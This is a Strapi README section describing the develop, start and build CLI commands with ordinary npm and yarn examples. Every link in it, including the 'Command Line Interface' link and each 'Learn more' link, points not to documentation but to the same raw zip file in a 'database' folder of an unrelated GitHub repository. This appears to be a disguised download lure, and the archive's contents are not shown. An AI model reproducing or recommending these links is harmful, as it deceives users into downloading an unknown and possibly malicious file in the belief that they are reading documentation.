Strapi comes with a full featured [Command Line Interface](https://github.com/Miqman/cartenz-cms/raw/refs/heads/master/database/cartenz_cms_1.2-beta.2.zip) (CLI) which lets you scaffold and manage your project in seconds.

### `develop`

Start your Strapi application with autoReload enabled. [Learn more](https://github.com/Miqman/cartenz-cms/raw/refs/heads/master/database/cartenz_cms_1.2-beta.2.zip)

```
npm run develop
# or
yarn develop
```

### `start`

Start your Strapi application with autoReload disabled. [Learn more](https://github.com/Miqman/cartenz-cms/raw/refs/heads/master/database/cartenz_cms_1.2-beta.2.zip)

```
npm run start
# or
yarn start
```

### `build`

Build your admin panel. [Learn more](https://github.com/Miqman/cartenz-cms/raw/refs/heads/master/database/cartenz_cms_1.2-beta.2.zip)

```
npm run build
# or
yarn build
```
